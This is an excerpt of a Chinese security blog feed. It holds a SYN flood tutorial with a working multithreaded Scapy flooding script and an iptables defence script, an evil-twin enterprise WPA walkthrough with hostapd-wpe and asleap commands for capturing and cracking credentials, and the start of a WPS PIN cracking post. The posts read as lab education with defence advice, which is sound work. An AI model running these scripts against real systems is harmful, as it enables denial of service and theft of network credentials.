class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Syn_flood</span><span class="params">(target_ip, target_port)</span>:</span></div><div class="line"> 	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"> 		port = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</div><div class="line"> 		send(IP(src=<span class="string">"1.1.1.1"</span>, dst=target_ip)/TCP(dport=target_port, sport=port),verbose=<span class="number">0</span>)</div><div class="line"> 		<span class="comment">#send(IP(dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_ip, target_port, threads)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"BEGIN TO ATTACK TARGET"</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, threads):</div><div class="line">		<span class="comment">#print "test" </span></div><div class="line">		t = threading.Thread(target=Syn_flood, args=(target_ip, target_port))</div><div class="line">		t.start()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>: </div><div class="line">	target_ip = raw_input(<span class="string">"Please input the target_ip: "</span>)</div><div class="line">	target_port = int(raw_input(<span class="string">"Please input the target_port: "</span>))</div><div class="line">	threads = int(raw_input(<span class="string">"Please input the threads: "</span>))</div><div class="line">	main(target_ip, target_port, threads)</div></pre></td></tr></table></figure>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到"><a href="#1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到" class="headerlink" title="1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到"></a>1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/D7EBB586D3244CBD93243747CE8FC296/1479" alt="image"></p>
<h4 id="2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"><a href="#2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口" class="headerlink" title="2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"></a>2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5C77A8A40E664C4792E55C8794927CB6/1484" alt="image"></p>
<h4 id="3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态"><a href="#3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态" class="headerlink" title="3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态"></a>3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/495E79F164574A8696349DBC68DC7BF2/1491" alt="image"></p>
<hr>
<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h3 id="emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"><a href="#emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对" class="headerlink" title="&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"></a>&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对</h3><h4 id="1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"><a href="#1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP" class="headerlink" title="1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"></a>1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP</h4><h4 id="2-减少SYN-RECEIVED的过期时间"><a href="#2-减少SYN-RECEIVED的过期时间" class="headerlink" title="2.减少SYN-RECEIVED的过期时间"></a>2.减少SYN-RECEIVED的过期时间</h4><h4 id="3-设置SYN-Cookie"><a href="#3-设置SYN-Cookie" class="headerlink" title="3.设置SYN Cookie"></a>3.设置SYN Cookie</h4><h4 id="4-设置防火墙的进站和入站规则"><a href="#4-设置防火墙的进站和入站规则" class="headerlink" title="4.设置防火墙的进站和入站规则"></a>4.设置防火墙的进站和入站规则</h4><h4 id="5-记录日志方便溯源追踪真凶"><a href="#5-记录日志方便溯源追踪真凶" class="headerlink" title="5.记录日志方便溯源追踪真凶"></a>5.记录日志方便溯源追踪真凶</h4><h3 id="防御脚本"><a href="#防御脚本" class="headerlink" title="[*]防御脚本"></a>[*]防御脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">netstat -an|grep SYN_RECV|awk <span class="string">'&#123;print$5&#125;'</span>|awk -F: <span class="string">'&#123;print$1&#125;'</span>|sort|uniq -c|sort -rn|awk <span class="string">'&#123;if ($1 &gt;5)  print $2&#125;'</span> &gt;&gt; /tmp/dropip</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat /tmp/dropip)</div><div class="line"><span class="keyword">do</span></div><div class="line">/sbin/iptables -A INPUT -s <span class="variable">$i</span> -j DROP</div><div class="line"><span class="built_in">echo</span> &amp;ldquo;<span class="variable">$i</span> <span class="built_in">kill</span> at `date`&amp;rdquo; &gt;&gt;/var/<span class="built_in">log</span>/ddos</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"><a href="#emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。" class="headerlink" title="&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"></a>&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(下)—企业级WPA破解]]></title>
      <url>/2017/09/03/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%8B)%E2%80%94%E4%BC%81%E4%B8%9A%E7%BA%A7WPA%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h2 id="0x00-企业级WPA-WPA2简介"><a href="#0x00-企业级WPA-WPA2简介" class="headerlink" title="0x00. 企业级WPA/WPA2简介"></a><strong>0x00. 企业级WPA/WPA2简介</strong></h2><h4 id="emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。"><a href="#emsp-emsp-WPA-WPA2企业版：在大型企业网络中，通常采用802-1X的接入认证方式。802-1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible-Authentication-Protocol）实现对用户的认证。WPA-WPA2支持基于EAP-TLS（Transport-Layer-Security）和EAP-PEAP（Protected-EAP）的802-1X认证方式。" class="headerlink" title="&emsp;&emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。"></a>&emsp;&emsp;WPA/WPA2企业版：在大型企业网络中，通常采用802.1X的接入认证方式。802.1X认证是一种基于接口的网络接入控制，用户提供认证所需的凭证，如用户名和密码，通过特定的用户认证服务器（一般是RADIUS服务器）和可扩展认证协议EAP（Extensible Authentication Protocol）实现对用户的认证。WPA/WPA2支持基于EAP-TLS（Transport Layer Security）和EAP-PEAP（Protected EAP）的802.1X认证方式。</h4><a id="more"></a>
<h2 id="0x01-WPA-WPA2企业版认证原理"><a href="#0x01-WPA-WPA2企业版认证原理" class="headerlink" title="0x01. WPA/WPA2企业版认证原理"></a><strong>0x01. WPA/WPA2企业版认证原理</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/54F51F9A7FAF47E2A10C6B88AFE7B07B/1150" alt="image"></p>
<h3 id="上图详细介绍了基于EAP-PEAP的802-1x认证方式（图片出自这里）"><a href="#上图详细介绍了基于EAP-PEAP的802-1x认证方式（图片出自这里）" class="headerlink" title="上图详细介绍了基于EAP-PEAP的802.1x认证方式（图片出自这里）"></a>上图详细介绍了基于EAP-PEAP的802.1x认证方式（<a href="http://blog.sina.com.cn/s/blog_afd4c4ef0102w4bz.html" target="_blank" rel="external">图片出自这里</a>）</h3><h4 id="emsp-emsp-1-首先STA向周围发送PROBE-REQUEST帧，等待应答"><a href="#emsp-emsp-1-首先STA向周围发送PROBE-REQUEST帧，等待应答" class="headerlink" title="&emsp;&emsp;1.首先STA向周围发送PROBE REQUEST帧，等待应答"></a>&emsp;&emsp;1.首先STA向周围发送PROBE REQUEST帧，等待应答</h4><h4 id="emsp-emsp-2-AP收到之后回应一个PROBE-RESPONSE帧给STA（AC连接多个AP）"><a href="#emsp-emsp-2-AP收到之后回应一个PROBE-RESPONSE帧给STA（AC连接多个AP）" class="headerlink" title="&emsp;&emsp;2.AP收到之后回应一个PROBE RESPONSE帧给STA（AC连接多个AP）"></a>&emsp;&emsp;2.AP收到之后回应一个PROBE RESPONSE帧给STA（AC连接多个AP）</h4><h4 id="emsp-emsp-3-认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程"><a href="#emsp-emsp-3-认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程" class="headerlink" title="&emsp;&emsp;3.认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程"></a>&emsp;&emsp;3.认证开始，AP本身不会进行认证过程，而是将STA发送过来的认证信息转发给后端的RADIUS服务器，由RADIUS服务器控制整个认证过程</h4><h4 id="emsp-emsp-4-认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）"><a href="#emsp-emsp-4-认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）" class="headerlink" title="&emsp;&emsp;4.认证成功，连接上AP（具体交换的数据信息我在WPA加密那篇说过了，这里不再累赘）"></a>&emsp;&emsp;4.认证成功，连接上AP（具体交换的数据信息我在<a href="https://times0ng.github.io/2017/08/30/无线渗透-上-WPA加密/">WPA加密</a>那篇说过了，这里不再累赘）</h4><h2 id="0x02-WPA-WPA2企业版攻击原理"><a href="#0x02-WPA-WPA2企业版攻击原理" class="headerlink" title="0x02. WPA/WPA2企业版攻击原理"></a><strong>0x02. WPA/WPA2企业版攻击原理</strong></h2><h4 id="emsp-emsp-在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。"><a href="#emsp-emsp-在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。" class="headerlink" title="&emsp;&emsp;在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。"></a>&emsp;&emsp;在企业级的WPA认证过程中会需要账号密码来登陆AP，我们所需要做的就是伪造一个相同ESSID的AP，同样在后端也伪造RADIUS服务器，如果STA来连接伪造的AP，那么它就会将加密后的密钥传输给我们的RADIUS服务器，离线破解密钥就能得到密码，账号是明文传输的。</h4><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><h4 id="emsp-emsp-1-伪造一个企业级的AP"><a href="#emsp-emsp-1-伪造一个企业级的AP" class="headerlink" title="&emsp;&emsp;1.伪造一个企业级的AP"></a>&emsp;&emsp;1.伪造一个企业级的AP</h4><h4 id="emsp-emsp-2-诱使目标连接AP，获取加密后的密钥"><a href="#emsp-emsp-2-诱使目标连接AP，获取加密后的密钥" class="headerlink" title="&emsp;&emsp;2.诱使目标连接AP，获取加密后的密钥"></a>&emsp;&emsp;2.诱使目标连接AP，获取加密后的密钥</h4><h4 id="emsp-emsp-3-离线破解，获取明文密钥"><a href="#emsp-emsp-3-离线破解，获取明文密钥" class="headerlink" title="&emsp;&emsp;3.离线破解，获取明文密钥"></a>&emsp;&emsp;3.离线破解，获取明文密钥</h4><h2 id="0x03-攻击实战"><a href="#0x03-攻击实战" class="headerlink" title="0x03. 攻击实战"></a><strong>0x03. 攻击实战</strong></h2><h4 id="下面给大家介绍一下攻击的操作步骤："><a href="#下面给大家介绍一下攻击的操作步骤：" class="headerlink" title="下面给大家介绍一下攻击的操作步骤："></a>下面给大家介绍一下攻击的操作步骤：</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-Linux虚拟机"><a href="#emsp-emsp-1-kali-Linux虚拟机" class="headerlink" title="&emsp;&emsp;1.kali Linux虚拟机"></a>&emsp;&emsp;1.kali Linux虚拟机</h4><h4 id="emsp-emsp-2-TL-WN722N网卡"><a href="#emsp-emsp-2-TL-WN722N网卡" class="headerlink" title="&emsp;&emsp;2.TL-WN722N网卡"></a>&emsp;&emsp;2.TL-WN722N网卡</h4><h3 id="环境布置与实战"><a href="#环境布置与实战" class="headerlink" title="环境布置与实战"></a>环境布置与实战</h3><h4 id="1-为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁"><a href="#1-为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁" class="headerlink" title="1.为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁"></a>1.为了伪造企业级的AP，我们需要先给kali中的hostapd打上hostapd-wpe补丁</h4><blockquote>
<p>git clone <a href="https://github.com/OpenSecurityResearch/hostapd-wpe" target="_blank" rel="external">https://github.com/OpenSecurityResearch/hostapd-wpe</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/6B43F1B59EF54B5BA8B0E9E615D324D6/1240" alt="image"></p>
<h4 id="2-下载最新版的hostpad，安装依赖包"><a href="#2-下载最新版的hostpad，安装依赖包" class="headerlink" title="2.下载最新版的hostpad，安装依赖包"></a>2.下载最新版的hostpad，安装依赖包</h4><blockquote>
<p>wget <a href="http://w1.fi/releases/hostapd-2.6.tar.gz" target="_blank" rel="external">http://w1.fi/releases/hostapd-2.6.tar.gz</a> &amp;&amp; apt-get install libssl-dev libnl-genl-3-dev &amp;&amp;apt-get install libssl1.0-dev</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/76DD94DE395047BF91BD72C8DD30AFE0/1248" alt="image"></p>
<h4 id="3-解开tar包，给hostpad-2-6打补丁"><a href="#3-解开tar包，给hostpad-2-6打补丁" class="headerlink" title="3.解开tar包，给hostpad-2.6打补丁"></a>3.解开tar包，给hostpad-2.6打补丁</h4><blockquote>
<p>tar zxvf hostapd-2.6.tar.gz &amp;&amp; cd hostapd-2.6 &amp;&amp; patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/F125FC9E885443BB9836165B24FF07E7/1255" alt="image"></p>
<h4 id="4-编译hostpad"><a href="#4-编译hostpad" class="headerlink" title="4.编译hostpad"></a>4.编译hostpad</h4><blockquote>
<p>cd hostapd/ &amp;&amp; make</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/8A64997CEACA44EFB81293587A6A6268/1266" alt="image"></p>
<h4 id="5-生成伪造证书"><a href="#5-生成伪造证书" class="headerlink" title="5.生成伪造证书"></a>5.生成伪造证书</h4><blockquote>
<p>cd ../../hostapd-wpe/certs/ &amp;&amp; ./bootstrap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/9CFFF7452B2240BBA16C45875C888B1B/1277" alt="image"></p>
<h4 id="6-配置hostapd-wpe-conf文件-ssid改为想要伪造的AP名字-我用的是wifi-free"><a href="#6-配置hostapd-wpe-conf文件-ssid改为想要伪造的AP名字-我用的是wifi-free" class="headerlink" title="6.配置hostapd-wpe.conf文件,ssid改为想要伪造的AP名字(我用的是wifi-free)"></a>6.配置hostapd-wpe.conf文件,ssid改为想要伪造的AP名字(我用的是wifi-free)</h4><blockquote>
<p>cd ../../hostapd-2.6/hostapd/ &amp;&amp; vim hostapd-wpe.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/ED1BAA2EBFC747A299AD411C6C758A3A/1282" alt="image"></p>
<h4 id="7-启动无线网卡-不用开启monitor模式"><a href="#7-启动无线网卡-不用开启monitor模式" class="headerlink" title="7.启动无线网卡,不用开启monitor模式"></a>7.启动无线网卡,不用开启monitor模式</h4><blockquote>
<p>service network-manager stop &amp;&amp; airmon-ng check kill &amp;&amp; ifconfig wlan0 up</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/1EA0DEE4A1034E15AED92EC39C01928F/1292" alt="image"></p>
<h4 id="8-伪造AP-诱使目标连接"><a href="#8-伪造AP-诱使目标连接" class="headerlink" title="8.伪造AP,诱使目标连接"></a>8.伪造AP,诱使目标连接</h4><blockquote>
<p>./hostapd-wpe hostapd-wpe.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/317A6ACB39EA468EABAB971E9038A33E/1299" alt="image"></p>
<h4 id="9-可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密-C指定challenge，-R指定response，-W指定字典文件-下面是破解出来的密码password"><a href="#9-可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密-C指定challenge，-R指定response，-W指定字典文件-下面是破解出来的密码password" class="headerlink" title="9.可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密, -C指定challenge，-R指定response，-W指定字典文件.下面是破解出来的密码password"></a>9.可以看到目标正在连接我们伪造的AP，用的username是admin，password经过了加密的，但是我们依然可以利用asleap来解密, -C指定challenge，-R指定response，-W指定字典文件.下面是破解出来的密码password</h4><blockquote>
<p>asleap -C 8d:a9:83:98:98:f4:34:a6 -R e5:24:78:69:2e:29:9f:ee:42:d8c:d7:4e:d3:f5:65:22:da:7d:57:24:14:da:14 -W ../../sqlmap.txt</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/5f4d0dd0aca33002f020b77347d73f51/xmlnote/4D28868782C4468393CEEAB02EB4B2FE/1312" alt="image"></p>
<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04. 防御"></a><strong>0x04. 防御</strong></h2><h4 id="emsp-emsp-和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。"><a href="#emsp-emsp-和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。" class="headerlink" title="&emsp;&emsp;和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。"></a>&emsp;&emsp;和WPA个人级的防御策略一样，不要随意在任何地方连接Wi-Fi，尽量将密码设置复杂一点，再安全的加密措施也会被弱密码毁于一旦。</h4><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a><strong>0x05. 结语</strong></h2><h4 id="emsp-emsp-关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。"><a href="#emsp-emsp-关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。" class="headerlink" title="&emsp;&emsp;关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家访问。"></a>&emsp;&emsp;关于密码破解的文章就写到这里了，下篇文章笔者会教大家如果伪造AP，其实本篇文章已经通过hostapd伪造过一个AP了，笔者不过是想多介绍几种方法，大家挑喜欢的去用吧！另外最近笔者创建了自己的博客，欢迎大家<a href="https://times0ng.github.io">访问</a>。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(中)--WPS破解]]></title>
      <url>/2017/08/30/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%AD)--WPS%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a><strong>0x00. 前言</strong></h2><h4 id="emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。"><a href="#emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。" class="headerlink" title="&emsp;&emsp;基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。"></a>&emsp;&emsp;基于第一篇文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484868&amp;idx=1&amp;sn=c9f9547e9bdb4fb9699ab47f2e307d35&amp;chksm=ec1e35ecdb69bcfa42443929bac42d030adda02d1885222aa53d6b4c49b736736be97d11ae7e&amp;mpshare=1&amp;scene=23&amp;srcid=0828jSmGdIm06mXCtMAZ6Ifq#rd" target="_blank" rel="external">WPA密码破解</a>的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。</h4><a id="more"></a>
<hr>
<h2 id="0x01-WPS简介"><a href="#0x01-WPS简介" class="headerlink" title="0x01. WPS简介"></a><strong>0x01. WPS简介</strong></h2><h4 id="WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。"><a href="#WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。" class="headerlink" title="WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。"></a>WPS是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。</h4><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><h4 id="emsp-通过PIN码来简化无线接入的操作，所以我们无需记住PSK"><a href="#emsp-通过PIN码来简化无线接入的操作，所以我们无需记住PSK" class="headerlink" title="&emsp;通过PIN码来简化无线接入的操作，所以我们无需记住PSK."></a>&emsp;通过PIN码来简化无线接入的操作，所以我们无需记住PSK.</h4><h3 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h3><h4 id="emsp-PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK"><a href="#emsp-PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK" class="headerlink" title="&emsp;PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK."></a>&emsp;PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK.</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/477431D45FB048F8AD50D9C417446789/1040" alt="image"></p>
<hr>
<h2 id="0x02-WPS破解实战"><a href="#0x02-WPS破解实战" class="headerlink" title="0x02. WPS破解实战"></a>0x02. <strong>WPS破解实战</strong></h2><h4 id="emsp-emsp-由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。"><a href="#emsp-emsp-由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。" class="headerlink" title="&emsp;&emsp;由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。"></a>&emsp;&emsp;由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。</h4><h3 id="实战流程"><a href="#实战流程" class="headerlink" title="实战流程"></a>实战流程</h3><h4 id="1-关闭会影响操作的进程，启动网卡置为monitor模式"><a href="#1-关闭会影响操作的进程，启动网卡置为monitor模式" class="headerlink" title="1.关闭会影响操作的进程，启动网卡置为monitor模式"></a>1.关闭会影响操作的进程，启动网卡置为monitor模式</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/4D2DF1CDFD874562974E89F262E80A2E/1065" alt="image"></p>
